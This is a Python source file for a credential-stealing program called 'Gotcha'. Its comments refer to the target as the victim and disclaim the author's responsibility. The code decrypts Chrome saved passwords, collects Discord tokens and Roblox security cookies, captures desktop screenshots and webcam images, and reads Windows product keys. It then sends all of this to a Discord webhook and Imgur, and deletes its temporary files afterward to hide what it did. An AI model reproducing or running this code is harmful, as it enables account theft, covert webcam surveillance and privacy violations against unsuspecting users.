import browser_cookie3 as steal, requests, base64, random, string, subprocess, zipfile, shutil, dhooks, os, re, sys, sqlite3, json
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES

# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

from base64 import b64decode, b64encode
from dhooks import Webhook, Embed, File
from PIL import ImageGrab as image
from subprocess import Popen, PIPE
from json import loads, dumps
from shutil import copyfile
import urllib.request
import json
import cv2
from time import sleep
from sys import argv
from pathlib import Path
import time
from os import remove
import os
from sys import argv
import ctypes

# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

DBP = r'Google\Chrome\User Data\Default\Login Data'
EBP = r'Microsoft\Edge\User Data\Default\Login Data'
OBP = r'\Opera Software\Opera Stable'
BBP = r'\BraveSoftware\Brave-Browser\User Data\Default\Login Data'
ADP = os.environ['LOCALAPPDATA']

# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)

# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher

# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]

# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)
# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\chromepasswords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None

if __name__ == "__main__":
    main = chrome()
    try:
        main.chromedb()
    except:
        pass
    main.saved()

# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

def upload():
    try:
        """create a randomized name for uploading purposes : removes the possibility of repeat images being embedded"""
        name = ''.join(random.choice(string.ascii_letters) for i in range (21))

        """upload our victim's desktop image to imgur => return the image link for later usage"""
        imgur = requests.post(
            r'https://api.imgur.com/3/upload.json', 
            headers = {"Authorization": "Client-ID placeholder "},
            data = {
                'key': 'placeholder', 
                'image': b64encode(open(r'C:\ProgramData\screenshot.jpg', 'rb').read()),
                'type': 'base64',
                'name': f'{name}.jpg',
                'title': f'{name}'})
        image = imgur.json()['data']['link']
        return image
    except:
        pass
# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

def uploadwc():
    try:
        """create a randomized name for uploading purposes : removes the possibility of repeat images being embedded"""
        name = ''.join(random.choice(string.ascii_letters) for i in range (22))

        """upload our victim's webcam image to imgur => return the image link for later usage"""
        imgur = requests.post(
            r'https://api.imgur.com/3/upload.json', 
            headers = {"Authorization": "Client-ID placeholder"},
            data = {
                'key': 'placeholder', 
                'image': b64encode(open(r'C:\ProgramData\webcamscreenshot.jpg', 'rb').read()),
                'type': 'base64',
                'name': f'{name}.jpg',
                'title': f'{name}'})
        image = imgur.json()['data']['link']
        return image
    except:
        pass

def beamed():
    hook = Webhook('placeholder')
    hostname = requests.get("https://api.ipify.org").text
    try:
    	test = test
    except:
        pass
    """Gets path for cookies """
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Lightcord': roaming + '\\Lightcord',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'
    

    """screenshot victim's desktop"""
    try:
        screenshot = image.grab()
        screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
        screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
        screenshot.close()
    except:
        pass

    """screenshot victim's webcam"""
    try:
        webcam = cv2.VideoCapture(0)
        sleep(2)
        while True:
            try:
                check, frame = webcam.read()
                cv2.imwrite(filename=r'C:\ProgramData\webcamscreenshot.jpg', img=frame)
                webcam.release()
                cv2.destroyAllWindows()
            except:
                pass
            break
    except:
        pass

    """gather our .zip variables"""
    try:
        zname = r'C:\ProgramData\victimfiles.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write(r'C:\ProgramData\chromepasswords.txt')
        newzip.close()
        victimfiles = File(r'C:\ProgramData\victimfiles.zip')
    except:
        pass

    """gather our windows product key variables"""
    try:
        user = os.getenv("UserName")
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
        sn = subprocess.check_output('wmic os get SerialNumber').decode().split('\n')[1].strip()
        sd = subprocess.check_output('wmic os get Manufacturer').decode().split('\n')[1].strip()
        el = subprocess.check_output('wmic os get EncryptionLevel').decode().split('\n')[1].strip()
    except:
        pass

    """steal victim's cookie"""
    cookie = [".ROBLOSECURITY"]
    cookies = []
    limit = 2000

    """chrome installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.chrome()))
    except:
        pass

    """opera installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.opera()))
    except:
        pass

    """edge installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.edge()))
    except:
        pass

    """brave installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.brave()))
    except:
        pass

    """read data => if we find a matching positive for our specified variable 'cookie', send it to our webhook."""
    try:
        for y in cookie:
            send = str([str(x) for x in cookies if y in str(x)])
            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
            for z in chunks:
                roblox = f'```' + f'{z}' + '```'
    except:
        pass

    """attempt to send all recieved data to our specified webhook"""
    try:
        embedWIN = Embed(title=f' [  Gotcha!\'s Logging Tool => We Have Logged {user}  ] ',description=f'{user}\'s data was extracted and we have succesfully linked to {user}\'s computer, here\'s the details:',color=16764108,timestamp='now')
        embedWIN.add_field("Windows Information:",f"WinType => {types}\nWinKey => {keys}\nEncryption =>  {el}\nManufacture => {sd}\nSerialNumber => {sn}")
        embedWIN.add_field("Location Information",f"IP => {hostname}")
        embedWIN.add_field("Roblox Security Token:",roblox)
        embedWIN.add_field("Extra Tokens Found:",message)
        embedWIN.set_image(url=upload())
        embedWIN.set_thumbnail(url=uploadwc())
    except:
        pass

    try:
        hook.send(file=victimfiles, embed=embedWIN)
    except:
        pass

    """attempt to remove all evidence, allows for victim to stay unaware of data extraction"""
    try:
        subprocess.os.system(r'del C:\ProgramData\screenshot.jpg')
        subprocess.os.system(r'del C:\ProgramData\webcamscreenshot.jpg')
        subprocess.os.system(r'del C:\ProgramData\chromepasswords.txt')
        subprocess.os.system(r'del C:\ProgramData\victimfiles.zip')
    except:
        pass
# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.

beamed()
